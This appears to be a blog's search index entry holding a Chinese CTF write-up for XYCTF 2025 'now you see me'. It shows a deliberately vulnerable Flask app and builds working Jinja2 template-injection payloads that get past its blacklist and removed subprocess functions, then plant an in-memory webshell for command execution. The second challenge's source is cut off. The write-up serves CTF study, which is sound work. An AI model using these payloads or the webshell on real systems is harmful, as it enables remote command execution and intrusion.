<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>xyctf2025 now you see me复现</title>
      <link href="/2025/08/16/%E5%AD%A6/SSTI/SSTI-flask-jinja/"/>
      <url>/2025/08/16/%E5%AD%A6/SSTI/SSTI-flask-jinja/</url>
      
        <content type="html"><![CDATA[<h1 id="now-you-see-me-1"><a href="#now-you-see-me-1" class="headerlink" title="now you see me 1"></a>now you see me 1</h1> <span id="more"></span><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># YOU FOUND ME ;)</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   src.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 01:10:37</span></span><br><span class="line"><span class="string">@Author  :   LamentXU</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">enable_hook =  <span class="literal">False</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event,args</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">if</span> enable_hook:</span><br><span class="line">        <span class="keyword">if</span> event <span class="keyword">in</span> [<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(event+<span class="string">&#x27;-------&#x27;</span>)</span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> counter &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;111---------&#x27;</span>)</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(event)</span><br><span class="line"></span><br><span class="line">lock_within = [</span><br><span class="line">    <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;form&quot;</span>, <span class="string">&quot;args&quot;</span>, <span class="string">&quot;values&quot;</span>,</span><br><span class="line">    <span class="string">&quot;headers&quot;</span>, <span class="string">&quot;json&quot;</span>, <span class="string">&quot;stream&quot;</span>, <span class="string">&quot;environ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;files&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;cookies&quot;</span>, <span class="string">&quot;application&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;url&#x27;</span> ,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>,<span class="string">&quot;self&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lipsum&quot;</span>, <span class="string">&quot;cycler&quot;</span>, <span class="string">&quot;joiner&quot;</span>, <span class="string">&quot;namespace&quot;</span>,</span><br><span class="line">    <span class="string">&quot;init&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;decode&quot;</span>,</span><br><span class="line">    <span class="string">&quot;batch&quot;</span>, <span class="string">&quot;first&quot;</span>, <span class="string">&quot;last&quot;</span> ,</span><br><span class="line">    <span class="string">&quot; &quot;</span>,<span class="string">&quot;dict&quot;</span>,<span class="string">&quot;list&quot;</span>,<span class="string">&quot;g.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;g|a&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>, <span class="string">&quot;lower&quot;</span>, <span class="string">&quot;upper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BUILTINS&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;WHOAMI&quot;</span>, <span class="string">&quot;path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;app&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;translate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;encode&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;pop&quot;</span>, <span class="string">&quot;referer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;The closer you see, the lesser you find.&quot;</span>]</span><br><span class="line">        <span class="comment"># I hate all these.</span></span><br><span class="line"><span class="comment">#lock_within=[]</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;try /H3dden_route&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/H3dden_route&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r3al_ins1de_th0ught</span>():</span><br><span class="line">    <span class="keyword">global</span> enable_hook, counter</span><br><span class="line">    name = flask.request.args.get(<span class="string">&#x27;My_ins1de_w0r1d&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">&quot;Follow-your-heart-&quot;</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> lock_within:</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;NOPE.&#x27;</span></span><br><span class="line">                enable_hook = <span class="literal">True</span></span><br><span class="line">                a = flask.render_template_string(<span class="string">&#x27;&#123;#&#x27;</span>+<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>+<span class="string">&#x27;#&#125;&#x27;</span>)</span><br><span class="line">                enable_hook = <span class="literal">False</span></span><br><span class="line">                counter = <span class="number">0</span></span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;My inside world is always hidden.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            counter = <span class="number">0</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;NO.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to Hidden_route!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">         <span class="keyword">import</span> _posixsubprocess</span><br><span class="line">         <span class="keyword">del</span> _posixsubprocess.fork_exec</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">         <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">del</span> os.popen</span><br><span class="line">    <span class="keyword">del</span> os.system</span><br><span class="line">    <span class="keyword">del</span> subprocess.Popen</span><br><span class="line">    <span class="keyword">del</span> subprocess.call</span><br><span class="line">    <span class="keyword">del</span> subprocess.run</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_output</span><br><span class="line">    <span class="keyword">del</span> subprocess.getoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_call</span><br><span class="line">    <span class="keyword">del</span> subprocess.getstatusoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.PIPE</span><br><span class="line">    <span class="keyword">del</span> subprocess.STDOUT</span><br><span class="line">    <span class="keyword">del</span> subprocess.CalledProcessError</span><br><span class="line">    <span class="keyword">del</span> subprocess.TimeoutExpired</span><br><span class="line">    <span class="keyword">del</span> subprocess.SubprocessError</span><br><span class="line">    sys.addaudithook(audit_checker)</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h3><p><code>&#39;#&#125;&#39;</code>闭合注释，用<code>&#123;%set a,b,c=request.mimetype.split()%&#125;</code>传参</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">base_url=<span class="string">&quot;http://192.168.94.128:5000/H3dden_route&quot;</span></span><br><span class="line">payload1=<span class="string">&quot;&quot;&quot;Follow-your-heart-#&#125;</span></span><br><span class="line"><span class="string">&#123;%set\ta,b,c=request.mimetype.split()%&#125;</span></span><br><span class="line"><span class="string">&#123;#&quot;&quot;&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;__class__ __base__ __subclasses__&quot;</span>&#125;</span><br><span class="line">req.prepare_url(base_url, &#123;<span class="string">&quot;My_ins1de_w0r1d&quot;</span>: payload1&#125;)</span><br><span class="line">res1 = requests.get(req.url,headers=headers)</span><br></pre></td></tr></table></figure><p>使用req.prepare_url处理url，直接requests.get会导致url第一个#不被编码，截断后续的payload，手动改成%23又会被二次编码成%2523</p><h3 id="找到-builtins"><a href="#找到-builtins" class="headerlink" title="找到__builtins__"></a>找到__builtins__</h3><p>从<a href="https://blog.csdn.net/oyf3085227433/article/details/147075769">这篇博客</a>得知可用request.close.__builtins__得到</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload2=<span class="string">f&quot;&quot;&quot;Follow-your-heart-#&#125;&#125;</span></span><br><span class="line"><span class="string">&#123;&#123;%set\tclo,cla,bt,ch,im,dl,oo,su,po,s,pp,rd,ag=request.mimetype.split()%&#125;&#125;</span></span><br><span class="line"><span class="string">&#123;&#123;%set\tbti=request|attr(clo)|attr(bt)%&#125;&#125;</span></span><br><span class="line"><span class="string">&#123;&#123;%print(bti)%&#125;&#125;</span></span><br><span class="line"><span class="string">&#123;&#123;#&quot;&quot;&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;&quot;&quot;close __class__ __builtins__ chr __import__ __delitem__ os subprocess _posixsubprocess sys popen read args&quot;&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="解决del-os-popen等"><a href="#解决del-os-popen等" class="headerlink" title="解决del os.popen等"></a>解决del os.popen等</h3><p>尝试</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;importlib&#x27;</span>).reload(_posixsubprocess);<span class="built_in">__import__</span>(<span class="string">&#x27;importlib&#x27;</span>).reload(subprocess);<span class="built_in">__import__</span>(<span class="string">&#x27;importlib&#x27;</span>).reload(os)</span><br></pre></td></tr></table></figure><p>但是即使<code>reload(_posixsubprocess)</code>了，<code>reload(subprocess)</code>还是会报错：&#96;cannot import name &#39;fork_exec&#39; from &#39;_posixsubprocess&#39; (unknown location)不知道为什么.</p><p>直接从sys.modules删除模块，重新引用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;os&#x27;</span>];<span class="keyword">del</span> sys.modules[<span class="string">&#x27;_posixsubprocess&#x27;</span>];<span class="keyword">del</span> sys.modules[<span class="string">&#x27;subprocess&#x27;</span>];<span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read())</span><br><span class="line"><span class="comment">#无空格版本</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;&quot;&quot;dict.__delitem__(sys.modules,&#x27;os&#x27;)</span></span><br><span class="line"><span class="string">dict.__delitem__(sys.modules,&#x27;subprocess&#x27;)</span></span><br><span class="line"><span class="string">dict.__delitem__(sys.modules,&#x27;_posixsubprocess&#x27;)</span></span><br><span class="line"><span class="string">print(__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read())&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="解决exec-compile限制"><a href="#解决exec-compile限制" class="headerlink" title="解决exec,compile限制"></a>解决exec,compile限制</h3><p>模板编译运行,exec()编译运行消耗4次, os.popen()运行超出限制</p><p>-可以利用在栈帧逃逸修改counter，之后任意编译执行<br>这样删除_posixsubprocess等模块可以写在exec里<br>内存马来源<a href="https://www.freebuf.com/articles/web/431815.html">这里</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> requests.models <span class="keyword">import</span> PreparedRequest</span><br><span class="line">req = PreparedRequest()</span><br><span class="line"></span><br><span class="line">code_disable_limit = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dict.__delitem__(sys.modules,&#x27;os&#x27;)</span></span><br><span class="line"><span class="string">dict.__delitem__(sys.modules,&#x27;subprocess&#x27;)</span></span><br><span class="line"><span class="string">dict.__delitem__(sys.modules,&#x27;_posixsubprocess&#x27;)</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string">    g = f()</span></span><br><span class="line"><span class="string">    frame = next(g)</span></span><br><span class="line"><span class="string">    for i in range(7):</span></span><br><span class="line"><span class="string">        frame=frame.f_back</span></span><br><span class="line"><span class="string">        print(frame)</span></span><br><span class="line"><span class="string">    frame.f_globals[&#x27;counter&#x27;]=-100</span></span><br><span class="line"><span class="string">    return 0</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">code_core=<span class="string">&quot;&quot;&quot;[ __import__(&#x27;time&#x27;).sleep(1) for flask in [__import__(&quot;flask&quot;)] for app in __import__(&quot;gc&quot;).get_objects() if type(app) == flask.Flask for jinja_globals in [app.jinja_env.globals] for c4tchm3 in [ lambda : __import__(&#x27;os&#x27;).popen(jinja_globals[&quot;request&quot;].args.get(&quot;cmd&quot;, &quot;id&quot;)).read() ] if [ app.__dict__.update(&#123;&#x27;_got_first_request&#x27;:False&#125;), app.add_url_rule(&quot;/s&quot;, endpoint=&quot;/s&quot;, view_func=c4tchm3) ] ]&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code=code_disable_limit+<span class="string">&#x27;\n&#x27;</span>+code_core</span><br><span class="line"></span><br><span class="line">base_url=<span class="string">f&quot;http://192.168.94.128:5000/H3dden_route&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload=&quot;变形前#&#125;&quot;+&quot;&quot;&quot;\</span></span><br><span class="line"><span class="comment"># &#123;%set builtin=request.close.__builtins__%&#125;\</span></span><br><span class="line"><span class="comment"># &#123;%set exe=builtin[&#x27;exec&#x27;]%&#125;\</span></span><br><span class="line"><span class="comment"># &#123;%set code=builtin[&#x27;__import__&#x27;](&#x27;flask&#x27;).request.args.get(&#x27;code&#x27;)%&#125;\</span></span><br><span class="line"><span class="comment"># &#123;%print(exe(code))%&#125;&quot;&quot;&quot;+&quot;&#123;#&quot;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;Follow-your-heart-#&#125;&quot;</span>+<span class="string">&quot;&quot;&quot;\</span></span><br><span class="line"><span class="string">&#123;%set\tcl,bt,ex,im,fl,rq,ag,cd=request.mimetype.split()%&#125;\</span></span><br><span class="line"><span class="string">&#123;%set\tbt=request|attr(cl)|attr(bt)%&#125;\</span></span><br><span class="line"><span class="string">&#123;%set\texe=bt.get(ex)%&#125;\</span></span><br><span class="line"><span class="string">&#123;%set\tcode=(request|attr(ag)).get(cd)%&#125;</span></span><br><span class="line"><span class="string">&#123;%print(exe(code))%&#125;&quot;&quot;&quot;</span>+<span class="string">&quot;&#123;#&quot;</span></span><br><span class="line"><span class="comment">#(request|attr(ag)).get(cd)少一对括号就不行</span></span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;&quot;&quot;close __builtins__ exec __import__ flask request args code&quot;&quot;&quot;</span>&#125;</span><br><span class="line">req.prepare_url(base_url, &#123;<span class="string">&quot;code&quot;</span>:code,<span class="string">&quot;My_ins1de_w0r1d&quot;</span>: payload&#125;)</span><br><span class="line"></span><br><span class="line">res = requests.get(req.url,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(res.url)</span><br></pre></td></tr></table></figure><p>访问&#x2F;s?cmd&#x3D;ls &#x2F;</p><ul><li>或者不用exec()<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> requests.models <span class="keyword">import</span> PreparedRequest</span><br><span class="line">req = PreparedRequest()</span><br><span class="line"></span><br><span class="line">base_url=<span class="string">&quot;http://192.168.94.128:5000/H3dden_route&quot;</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&quot;&quot;&quot;Follow-your-heart-#&#125;</span></span><br><span class="line"><span class="string">&#123;%set\tclo,cla,bt,ch,im,dl,oo,su,po,s,pp,rd,ag=request.mimetype.split()%&#125;</span></span><br><span class="line"><span class="string">&#123;%set\tbti=request|attr(clo)|attr(bt)%&#125;</span></span><br><span class="line"><span class="string">&#123;%set\tchr=bti.get(ch)%&#125;</span></span><br><span class="line"><span class="string">&#123;%set\timp=bti.get(im)%&#125;</span></span><br><span class="line"><span class="string">&#123;%set\tsys=imp(s)%&#125;</span></span><br><span class="line"><span class="string">&#123;%set\tdit=&#123;&#125;|attr(cla)%&#125;</span></span><br><span class="line"><span class="string">&#123;%print(dit|attr(dl)(sys.modules,oo))%&#125;</span></span><br><span class="line"><span class="string">&#123;%print(dit|attr(dl)(sys.modules,su))%&#125;</span></span><br><span class="line"><span class="string">&#123;%print(dit|attr(dl)(sys.modules,po))%&#125;</span></span><br><span class="line"><span class="string">&#123;%print((request|attr(ag)).get(ag))%&#125;</span></span><br><span class="line"><span class="string">&#123;%print(imp(oo)|attr(pp)((request|attr(ag)).get(ag))|attr(rd)())%&#125;</span></span><br><span class="line"><span class="string">&#123;#&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#line19 .get前少一对括号就报错expected token &#x27;)&#x27;, got &#x27;.&#x27;</span></span><br><span class="line">headers=&#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;&quot;&quot;close __class__ __builtins__ chr __import__ __delitem__ os subprocess _posixsubprocess sys popen read args&quot;&quot;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">req.prepare_url(base_url, &#123;<span class="string">&quot;My_ins1de_w0r1d&quot;</span>: payload2, <span class="string">&quot;args&quot;</span>:<span class="string">&quot;ls /&quot;</span>&#125;)</span><br><span class="line">res = requests.get(req.url,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></li></ul><h1 id="now-you-see-me-2"><a href="#now-you-see-me-2" class="headerlink" title="now you see me 2"></a>now you see me 2</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># YOU FOUND ME ;)</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   src.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 01:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># DNS config: No reversing shells for you.</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> time, random, traceback</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line">enable_hook =  <span class="literal">False</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event,args</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">if</span> enable_hook:</span><br><span class="line">        <span class="keyword">if</span> event <span class="keyword">in</span> [<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(event)</span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> counter &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(event)</span><br><span class="line">lock_within = [</span><br><span class="line">    <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;form&quot;</span>, <span class="string">&quot;args&quot;</span>, <span class="string">&quot;values&quot;</span>,</span><br><span class="line">    <span class="string">&quot;headers&quot;</span>, <span class="string">&quot;json&quot;</span>, <span class="string">&quot;stream&quot;</span>, <span class="string">&quot;environ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;files&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;cookies&quot;</span>, <span class="string">&quot;application&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;url&#x27;</span> ,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>,<span class="string">&quot;self&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lipsum&quot;</span>, <span class="string">&quot;cycler&quot;</span>, <span class="string">&quot;joiner&quot;</span>, <span class="string">&quot;namespace&quot;</span>,</span><br><span class="line">    <span class="string">&quot;init&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;decode&quot;</span>,</span><br><span class="line">    <span class="string">&quot;batch&quot;</span>, <span 